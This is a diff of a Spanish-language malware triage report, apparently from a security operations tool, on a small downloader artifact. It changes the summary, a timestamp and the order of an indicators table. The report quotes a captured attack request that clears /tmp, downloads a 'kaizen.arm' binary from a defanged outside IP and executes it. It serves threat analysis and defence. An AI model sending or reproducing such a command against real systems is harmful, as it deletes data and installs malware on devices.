@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 276 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `kaizen.arm` en `hxxp://176.65.149.XXX/bins/kaizen.arm`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:38:23+00:00`
+- **Registrado:** `2026-08-09T20:38:23.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,10 +54,10 @@ GET /shell?cd+/tmp;rm+-rf+*;wget+hxxp://176.65.149.XXX/bins/kaizen.arm;chmod+777
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 176.65.149.XXX | static_analysis |
 | url | hxxp://176.65.149.XXX/bins/kaizen.arm;chmod+777+kaizen.arm;./kaizen.arm | strings |
-| hash | 22dc7c044948730d0a3206ddd8a68af168349b0cd488c75fa2256c2fc5b68a56 | static_analysis |
+| ip | 176.65.149.XXX | static_analysis |
 | command | GET /shell?cd+/tmp;rm+-rf+*;wget+hxxp://176.65.149.XXX/bins/kaizen.arm;chmod+777+kaizen.arm;./kaizen.arm HTTP/1.1 | strings |
+| hash | 22dc7c044948730d0a3206ddd8a68af168349b0cd488c75fa2256c2fc5b68a56 | static_analysis |
 | ip | 222.212.83.XXX | artifact_source |
 
 ## 🔎 Triage
